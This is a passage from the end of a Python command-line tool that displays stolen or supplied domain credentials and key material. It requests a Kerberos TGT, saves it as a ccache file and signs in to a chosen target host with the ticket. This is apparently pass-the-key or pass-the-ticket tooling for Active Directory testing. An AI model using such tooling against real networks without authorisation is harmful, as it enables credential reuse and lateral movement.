            print(f" Username : {creds['username']}")
            print(f" DC IP    : {creds['dc_ip']}")
            if creds["aeskey"]:
                masked = creds["aeskey"][:8] + "..." + creds["aeskey"][-8:]
                print(f" {creds['key_type']} Key : {masked}")
            print("=" * 60)

            try:
                confirm = input("\n Proceed with TGT request? [Y/n]: ").strip().lower()
                if confirm in ("n", "no"):
                    print("[!] Aborted by user.")
                    continue
            except (KeyboardInterrupt, EOFError):
                print("\n[!] Cancelled.")
                continue

            tgt, session_key = request_tgt(creds)
            ccache_path = save_ticket(creds["username"], tgt, session_key)
            verify_ticket_file(creds["username"])

            if mode == "1":
                print_next_steps(creds["username"], creds["domain"], creds["dc_ip"])
                print("[+] Done. Ticket saved.\n")
                continue

            # Mode 2: Get TGT + Sign in
            inner = 78
            pad = lambda text: "║  " + text + " " * (inner - len(text) - 4) + "║"
            print(f"{C.BD}{C.B}╔{"═" * inner}╗{C.X}")
            print(f"{C.BD}{C.B}{pad("SIGN IN WITH TICKET")}{C.X}")
            print(f"{C.BD}{C.B}╚{"═" * inner}╝{C.X}")
            target = get_input(" Target IP/Hostname", required=True, validator=validate_target)
            ccache_file = f"{creds['username']}.ccache"
            sign_in_with_ticket(target, creds["username"], creds["domain"], creds["dc_ip"], ccache_file)
            continue

        print("[-] Invalid choice. Enter 1-6.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user. Exiting cleanly.")
        sys.exit(0)
